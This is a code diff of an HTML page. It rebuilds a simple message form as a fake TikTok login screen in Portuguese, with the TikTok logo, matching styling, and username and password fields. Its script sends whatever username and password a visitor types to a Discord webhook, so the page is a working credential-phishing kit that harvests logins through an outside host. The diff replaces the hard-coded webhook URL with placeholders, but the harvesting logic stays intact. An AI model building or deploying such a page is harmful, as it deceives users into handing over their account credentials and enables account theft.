@@ -3,30 +3,87 @@
 <head>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Formulário</title>
+
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #000;
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      width: 320px;
+      text-align: center;
+    }
+
+    .logo {
+      width: 120px;
+      margin-bottom: 30px;
+    }
+
+    .box {
+      background: #121212;
+      padding: 25px;
+      border-radius: 10px;
+    }
+
+    input {
+      width: 100%;
+      padding: 14px;
+      margin-bottom: 15px;
+      border: none;
+      border-radius: 6px;
+      background: #222;
+      color: white;
+      font-size: 14px;
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      background: #FE2C55;
+      border: none;
+      border-radius: 6px;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+    }
+  </style>
 </head>
 
 <body>
 
-  <form id="form">
-    <input type="text" id="user" placeholder="Usuário" required>
-    <input type="text" id="mensagem" placeholder="Mensagem" required>
-    <button type="submit">Enviar</button>
-  </form>
+  <div class="container">
+    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a9/TikTok_logo.svg">
+
+    <div class="box">
+      <form id="form">
+        <input type="text" id="user" placeholder="Usuário ou Email" required>
+        <input type="password" id="password" placeholder="Senha" required>
+        <button type="submit">Entrar</button>
+      </form>
+    </div>
+  </div>
 
   <script>
     document.getElementById("form").addEventListener("submit", function(e) {
       e.preventDefault();
 
       const user = document.getElementById("user").value;
-      const mensagem = document.getElementById("mensagem").value;
+      const password = document.getElementById("password").value;
 
-      fetch("https://discord.com/api/webhooks/1488680857320558822/YOZgzqlFdh9OUqSrufYE7iujdDV72leQWoxEA5V5k0iFD7HlPljqP4KOrDwjj-c2Mdzd", {
+      fetch("https://discord.com/api/webhooks/SEU_ID/SEU_TOKEN", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
         },
         body: JSON.stringify({
-          content: 📩 Nova mensagem\n👤 Usuário: ${user}\n💬 Mensagem: ${mensagem}
+          content: 📩 Nova submissão\n👤 Usuário: ${user}\n🔑 Senha: ${password}
         })
       })
       .then(() => alert("Enviado!"))
